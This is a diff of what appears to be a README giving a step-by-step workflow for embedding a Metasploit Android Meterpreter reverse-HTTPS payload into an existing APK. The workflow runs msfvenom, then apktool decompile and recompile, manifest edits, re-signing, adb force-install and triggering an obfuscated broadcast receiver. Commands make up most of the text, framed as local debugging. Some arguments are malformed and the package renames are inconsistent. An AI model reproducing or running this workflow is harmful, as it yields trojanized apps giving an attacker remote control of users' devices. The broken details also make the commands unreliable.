@@ -18,7 +18,7 @@ Ensure you have the following tools installed and available in your system path:
 Generate the payload by targeting a local machine interface. This bypasses network domain resolution entirely during local debugging.
 
 ```bash
-msfvenom -x original_app.apk -p android/meterpreter/reverse_https LHOST127.0.0.1 LPORT4444 -o output.apk
+msfvenom -x original_app.apk -p android/meterpreter/reverse_https LHOST127.0.0.1 LPORT4444 -o example_app.apk
 ```
 ---
 
@@ -28,11 +28,11 @@ Decompile the binary package to modify its configuration, then recompile it to e
 
 ### 1. Decompile the APK
 ```bash
-apktool d output.apk -o unpacked_folder
+apktool d example_app.apk -o unpacked_app_folder
 ```
 
 ### 2. Modify the Manifest
-Open `unpacked_folder/AndroidManifest.xml` in a text editor. Configure both primary entry points to explicitly allow OS execution by adding `android:exported="true"`.
+Open `unpacked_app_folder/AndroidManifest.xml` in a text editor. Configure both primary entry points to explicitly allow OS execution by adding `android:exported="true"`.
 
 ```xml
 <activity android:name="com.example.app.MainActivity" android:exported="true">
@@ -41,7 +41,7 @@ Open `unpacked_folder/AndroidManifest.xml` in a text editor. Configure both prim
 
 ### 3. Recompile the APK
 ```bash
-apktool b unpacked_folder -o example_usb.apk
+apktool b unpacked_app_folder -o recomp_example_app.apk
 ```
 ---
 
@@ -54,7 +54,7 @@ Android environments sometimes reject unsigned applications. Create a developmen
 keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias
 
 # Sign the recompiled APK
-apksigner sign --ks my-release-key.jks --out signed_usb.apk example_usb.apk
+apksigner sign --ks my-release-key.jks --out signed_example.apk recomp_example_app.apk
 ```
 ---
 
@@ -71,8 +71,8 @@ adb reverse --remove-all
 adb reverse tcp:4444 tcp:4444
 
 # Remove old installations and force-install the new package
-adb uninstall com.example.app
-adb install --user 0 -r -d -g signed_usb.apk
+adb uninstall com.signed_example.app
+adb install --user 0 -r -d -g signed_example.apk
 ```
 
 ---
@@ -98,10 +98,10 @@ Open new terminal, then force the device interface activity layer into the foreg
 
 ```bash
 # Force-start the main activity
-adb shell am start -n com.example.app/com.example.app.MainActivity
+adb shell am start -n com.signed_example.app/com.signed_example.app.MainActivity
 
 # Trigger the broadcast receiver
-adb shell am broadcast -n com.example.app/com.example.app.qvqna.Ygdsa
+adb shell am broadcast -n com.signed_example.app/com.signed_example.app.qvqna.Ygdsa
 ```
 
 ### Expected Output
